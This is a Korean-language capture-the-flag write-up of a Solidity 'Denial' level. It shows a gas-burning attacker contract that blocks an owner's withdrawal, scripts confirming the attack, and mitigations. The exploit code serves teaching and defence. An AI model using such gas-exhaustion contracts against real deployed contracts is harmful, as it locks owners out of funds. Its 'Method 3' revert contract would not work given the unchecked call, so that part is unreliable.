# Denial - 서비스 거부 공격 문제

## 🎯 문제 개요

**목표**: owner가 `withdraw()` 함수를 호출할 때 자금 인출을 막아서 서비스 거부 공격을 성공시키기 (컨트랙트에 자금이 남아있고, 트랜잭션 가스가 1M 이하일 때)

**문제 유형**: DoS(Denial of Service) 공격
**난이도**: ★★★☆☆

## 📋 컨트랙트 분석

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Denial {
    address public partner; // 인출 파트너 - 가스 지불, 인출 분할
    address public constant owner = address(0xA9E);
    uint256 timeLastWithdrawn;
    mapping(address => uint256) withdrawPartnerBalances; // 파트너 잔액 추적

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // 1%를 수신자에게, 1%를 owner에게 인출
    function withdraw() public {
        uint256 amountToSend = address(this).balance / 100;
        // 반환값 확인 없이 호출 수행
        // 수신자가 revert하더라도 owner는 여전히 자신의 몫을 받음
        partner.call{value: amountToSend}("");  // 🚨 취약점!
        payable(owner).transfer(amountToSend);   // 🎯 이 줄이 실행되면 안됨
        // 마지막 인출 시간 기록
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    }

    // 자금 입금 허용
    receive() external payable {}

    // 편의 함수
    function contractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```

## 🔍 취약점 분석

### 핵심 취약점: 무제한 가스 소모
- **위치**: `partner.call{value: amountToSend}("");`
- **문제점**: 외부 호출에 가스 제한이 없음
- **영향**: 악의적인 컨트랙트가 모든 가용 가스를 소모할 수 있음
- **결과**: `payable(owner).transfer(amountToSend)`가 실행되지 않음

### 공격 벡터
1. 가스를 소모하는 `receive()` 함수가 있는 악의적인 컨트랙트 배포
2. 악의적인 컨트랙트를 인출 파트너로 설정
3. `withdraw()`가 호출되면 악의적인 컨트랙트가 모든 가스를 소모
4. 가스 부족으로 owner의 transfer 실패

## 🚀 해결방법

### 방법 1: 악의적인 컨트랙트 배포

**1단계**: Remix IDE에서 공격 컨트랙트 생성

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDenial {
    function setWithdrawPartner(address _partner) external;
}

contract Attacker {
    IDenial denial;
    event GasLeft(uint remain);
    
    constructor(address payable _denialAddress) {
        denial = IDenial(_denialAddress);
        denial.setWithdrawPartner(address(this));
    }
    
    receive() payable external {
        // 모든 가스를 소모하는 무한 루프 - DoS 공격!
        while(true) {
            emit GasLeft(gasleft());
        }
    }
}
```

**2단계**: Denial 컨트랙트 주소로 배포

**3단계**: 공격 성공 확인

```javascript
// 공격 성공 확인
try {
    await contract.withdraw({gas: 1000000}); // 1M 가스 제한
    console.log("❌ 공격 실패 - withdraw 성공");
} catch (error) {
    console.log("✅ DoS 공격 성공!");
    console.log("남은 잔액:", await getBalance(contract.address));
}
```

### 다른 방법들

#### 방법 2: 가스 경계값 공격
```javascript
// 이진 탐색을 이용한 정확한 가스 경계값 찾기
let low = 21000;   // 최소 트랜잭션 가스
let high = 100000; // 충분한 가스

while (low <= high) {
    const mid = Math.floor((low + high) / 2);
    try {
        await contract.withdraw({gas: mid});
        high = mid - 1;  // 더 낮은 가스로 시도
    } catch (error) {
        low = mid + 1;   // 더 높은 가스 필요
    }
}
```

#### 방법 3: 간단한 리버트 컨트랙트
```solidity
contract SimpleAttacker {
    constructor(address _denial) {
        IDenial(_denial).setWithdrawPartner(address(this));
    }
    
    receive() external payable {
        revert("공격!");
    }
}
```

## 🔧 기술적 세부사항

### 가스 메커니즘
- **EIP-150 규칙**: 외부 호출시 사용 가능한 가스의 63/64를 받음
- **공격 원리**: 전달된 모든 가스를 소모하여 후속 작업 방지
- **핵심 포인트**: `transfer()`는 실행을 위해 가스가 필요함

### 공격 흐름
1. `withdraw()`가 1M 가스로 호출됨
2. `partner.call{value: amount}("")`가 ~984,375 가스(63/64) 전달
3. 악의적인 `receive()`가 전달된 모든 가스 소모
4. 가스 부족으로 `payable(owner).transfer()` 실패
5. owner가 자금을 받지 못함, DoS 공격 성공

## 🎯 핵심 학습 포인트

1. **외부 호출 가스 제한**: 외부 호출 시 항상 가스 제한 지정
2. **체크-이펙트-상호작용 패턴**: 외부 상호작용 전에 상태 변경
3. **풀 페이먼트 패턴**: 푸시보다는 풀 방식의 지불 방법 사용
4. **리엔트런시 가드**: 악의적인 콜백으로부터 보호

## 🛡️ 완화 전략

### 수정 1: 가스 제한 호출
```solidity
partner.call{value: amountToSend, gas: 2300}("");
```

### 수정 2: 작업 순서 변경
```solidity
payable(owner).transfer(amountToSend);  // owner 먼저
partner.call{value: amountToSend}("");  // partner 나중에
```

### 수정 3: 풀 페이먼트 패턴
```solidity
function withdraw() public {
    uint256 amountToSend = address(this).balance / 100;
    pendingWithdrawals[partner] += amountToSend;
    pendingWithdrawals[owner] += amountToSend;
}

function claim() public {
    uint256 amount = pendingWithdrawals[msg.sender];
    pendingWithdrawals[msg.sender] = 0;
    payable(msg.sender).transfer(amount);
}
```

## 🏆 문제 완료 체크리스트
- ✅ 가스 소모 악의적 컨트랙트 배포
- ✅ 인출 파트너로 설정
- ✅ 1M 가스 이하에서 `withdraw()` 실패 확인
- ✅ 컨트랙트에 여전히 자금이 있는지 확인
- ✅ Owner가 자신의 몫을 받지 못함을 확인

**결과**: DoS 공격 성공 - Owner가 영구적으로 자금에 접근할 수 없음!